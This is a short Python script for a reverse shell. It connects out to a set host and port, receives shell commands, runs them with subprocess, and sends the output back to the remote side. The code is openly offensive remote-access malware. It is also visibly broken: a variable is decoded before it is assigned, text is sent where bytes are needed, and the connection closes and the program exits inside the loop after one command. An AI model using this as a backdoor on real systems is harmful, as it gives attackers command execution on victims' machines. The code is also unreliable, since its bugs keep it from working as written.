from re import sub
import socket
import subprocess

REMOTE_HOST = "127.0.0.1" # Remote host
REMOTE_PORT = 8081 # Remote port
client = socket.socket()
print("[-] Connection Initalized")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[+] Connected to %s:%d" % (REMOTE_HOST, REMOTE_PORT))

while True:
    print("[+] Waiting for command")
    com = com.decode()
    com = client.recv(1024)
    print("[+] Command Received")
    op = subprocess.Popen(com, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = op.stdout.read() + op.stderr.read()
    output = output.decode()
    print("[+] Output Sent")
    client.send(output)
    print("[+] Output Sent")
    if "exit" in com:
        break
    client.close()
    print("[+] Connection Closed")
    exit()
    